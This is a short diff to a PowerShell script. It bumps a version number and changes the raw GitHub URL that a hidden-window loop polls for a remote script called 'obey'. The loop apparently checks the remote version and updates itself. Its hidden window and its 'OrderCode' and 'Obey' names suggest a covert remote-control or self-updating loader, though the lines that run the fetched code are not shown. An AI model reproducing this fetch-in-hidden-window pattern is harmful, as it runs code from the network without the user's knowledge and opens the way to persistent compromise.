@@ -1,4 +1,4 @@
-[string]$Version = 11
+[string]$Version = 12
 #TODO update this version
 
 echo "Process script starting: $Pid"
@@ -54,7 +54,7 @@ $OrderCode = 'PowerShell.exe -windowstyle hidden {
 	while($update){
 		#echo "hello"
         $remote_script = $null
-		$remote_script = Invoke-WebRequest -URI "https://raw.githubusercontent.com/k4d4m/Obey/master/code" | Select -expand Content
+		$remote_script = Invoke-WebRequest -URI "https://raw.githubusercontent.com/k4d4m/obey/master/script.ps1" | Select -expand Content
 		#$remote_script
 		$remote_version = ($remote_script -split '+'''\n'''+')[0]
 		$remote_version = $remote_version.substring(19)
